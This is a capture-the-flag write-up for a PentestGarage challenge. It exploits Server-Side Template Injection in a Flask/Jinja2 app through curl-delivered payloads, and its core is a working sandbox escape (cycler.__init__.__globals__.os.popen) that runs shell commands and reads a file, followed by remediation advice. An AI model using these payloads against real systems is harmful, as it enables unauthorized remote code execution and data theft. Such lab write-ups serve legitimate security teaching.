# PentestGarage — SSTI ("Machine Control")

- **Category:** Web Security
- **Difficulty:** Medium (200 pts)
- **Date solved:** 2026-08-10
- **Target:** `ctf-gokulpg-ssti-068e5615.challenges.pentestgarage.com:80`
- **Flag:** `ctf{__redacted__}` *(solved; value removed for public repo)*

## Summary
A Flask app rendered user input from the `name` field directly into a Jinja2
template, giving Server-Side Template Injection → remote code execution → flag read.

## Steps

### 1. Recon
Homepage has a form posting `name` to `/say_hello`. Server header/behavior = Flask.

```bash
TARGET="ctf-gokulpg-ssti-068e5615.challenges.pentestgarage.com"
curl -s -i http://$TARGET/            # form action=/say_hello, method=POST, field name=name
```

### 2. Confirm SSTI + fingerprint engine
```bash
curl -s -X POST http://$TARGET/say_hello -d 'name=krish'              # -> Hello, krish
curl -s -X POST http://$TARGET/say_hello --data-urlencode 'name={{7*7}}'    # -> Hello, 49
curl -s -X POST http://$TARGET/say_hello --data-urlencode 'name={{7*"7"}}'  # -> Hello, 7777777
```
`49` + `7777777` => Jinja2 / Flask (Python).

### 3. Enumerate config (no secret here, SECRET_KEY=None)
```bash
curl -s -X POST http://$TARGET/say_hello --data-urlencode 'name={{config}}'
```

### 4. RCE via Jinja2 sandbox escape
```bash
curl -s -X POST http://$TARGET/say_hello --data-urlencode \
 "name={{ cycler.__init__.__globals__.os.popen('id').read() }}"
# uid=1000(ctf) gid=1000(ctf)
```

### 5. Locate + read flag
App runs from `/usr/src/app`; `flag.txt` sits next to `app.py`.
```bash
curl -s -X POST http://$TARGET/say_hello --data-urlencode \
 "name={{ cycler.__init__.__globals__.os.popen('pwd; ls -la').read() }}"

curl -s -X POST http://$TARGET/say_hello --data-urlencode \
 "name={{ cycler.__init__.__globals__.os.popen('cat /usr/src/app/flag.txt').read() }}"
# ctf{__redacted__}
```

## Notes / gotchas
- Keep payloads single-quoted; nested double quotes inside the `os.popen('...')`
  string broke the template (HTTP 500).
- `sed -e 's/<[^>]*>//g' -e "s/&#39;/'/g"` cleans HTML-entity-encoded output for readability.

## Remediation
- Never render untrusted input as a template. Pass user data as template
  *variables* (`render_template('t.html', name=name)`), not into the template string.
- Use Jinja2 autoescaping / a sandboxed environment; validate & escape input.
